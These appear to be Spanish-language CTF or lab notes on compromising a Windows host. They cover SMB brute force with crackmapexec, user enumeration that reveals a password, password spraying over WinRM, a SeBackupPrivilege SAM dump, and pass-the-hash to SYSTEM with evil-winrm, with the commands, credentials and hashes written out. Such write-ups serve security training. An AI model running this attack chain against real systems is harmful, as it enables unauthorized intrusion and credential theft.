PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp open winrm

-Intentamos listar el contenido de SMB pero no tenemos permisos

-Hacemos Fuzzing el puerto 80 y encontramos la ruta --> /speed

-Probamos Fuzzing pero no encontramos nada. Mirando la web en el apartado de 'Our Team' vemos varios posibles usuarios.

-Hacemos fuerza bruta a SMB con el primero de ellos:
	-crackmapexec smb 192.168.1.141 -u p.smith -p /usr/share/wordlists/rockyou.txt
		-password: kissme

-Probamos a listar contenido de SMB pero solo tenemos permisos de READ en IPC$ y no nos sirve

-Probamos a conectarnos con evil-winrm y con impacket-psexec , pero el usuario no tiene los permisos suficientes

-Probamos a enumerar otros usuarios, aportando las credenciales del usuario que ya tenemos:
	-**Con crackmapexec:**
		-crackmapexec smb 192.168.1.141 -u 'p.smith' -p 'kissme' --users
			HOSTING\Administrador                  
			HOSTING\administrator                  
			HOSTING\DefaultAccount                 
			HOSTING\f.miller                       
			HOSTING\Invitado                       
			HOSTING\j.wilson                       
			HOSTING\m.davis                        H0$T1nG123!
			HOSTING\p.smith                        
			HOSTING\WDAGUtilityAccount  
	-**Con Metasploit:**
		-Módulo --> **auxiliary/scanner/smb/smb_enumusers**
			-set rhosts
			-set smbuser p.smith
			-set smbpass kissme
			-run  
				(Nos muestra los mismos usuarios que crackmapexec pero no encuentra la password)

-Crackmapexec nos ha encontrado la contraseña **'H0$T1nG123!'** para el usuario --> m.davis

-Nos intentamos conectar por SMB con las credenciales obtenidas y no funciona

-Metemos todos los usuarios en un fichero y la contraseña obtenida en otro y hacemos fuerza bruta:
	-Por SMB:
		-crackmapexec smb 192.168.1.141 -u users.txt -p 'H0$T1nG123!' --continue-on-success
			j.wilson:H0$T1nG123!
	-Por Winrm:
		-crackmapexec winrm 192.168.1.141 -u users.txt -p 'H0$T1nG123!' --continue-on-success
			j.wilson:H0$T1nG123! (Pwn3d!)
	-También se puede hacer con la herramienta nxc:
		-nxc smb 192.168.1.141 -u users.txt -p 'H0$T1nG123!' --continue-on-success
			j.wilson:H0$T1nG123!

-Nos conectamos con las credenciales obtenidas con evil-winrm:
	-evil-winrm -i 192.168.1.141 -u j.wilson -p 'H0$T1nG123!'
		*Evil-WinRM* PS C:\Users\j.wilson\Documents> 
		ESTAMOS DENTROO!!


## Escalada de Privilegios

-Tenemos el siguiente privilegio:
	-whoami /priv
		SeBackupPrivilege      

-Como explotar 'SeBackupPrivilege':
	-Creamos carpeta C:\temp
	-Ejecutamos los siguientes comandos para copiarnos los hashes de SAM en nuestra máquina local:
		-reg save hklm\sam c:\temp\sam
		-reg save hklm\system c:\temp\system
		-C:\temp> download system                                      
		-C:\temp> download sam                                       

-En nuestra máquina, vemos el contenido de los hashes:
	-impacket-secretsdump -sam sam -system system LOCAL
	-El hash de administrator:

administrator:1002:aad3b435b51404eeaad3b435b51404ee:41186fb28e283ff758bb3dbeb6fb4a5c:::

-Copiamos el hash **NTLM** , que es el que viene después de los ':'
	41186fb28e283ff758bb3dbeb6fb4a5c

-Para confirmar que el hash NTLM de 'administrator' es correcto:
	-crackmapexec winrm 192.168.1.141 -u administrator -H '41186fb28e283ff758bb3dbeb6fb4a5c'
		WINRM       192.168.1.141   5985   HOSTING          [+] HOSTING\administrator:41186fb28e283ff758bb3dbeb6fb4a5c (Pwned! )

-Hacemos un ataque **Pass-The-Hash** y nos autenticamos con el usuario 'adminitrator':
	-evil-winrm -i 192.168.1.141 -u administrator -H '41186fb28e283ff758bb3dbeb6fb4a5c'
		*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
			NT\AUTHORITY SYSTEM





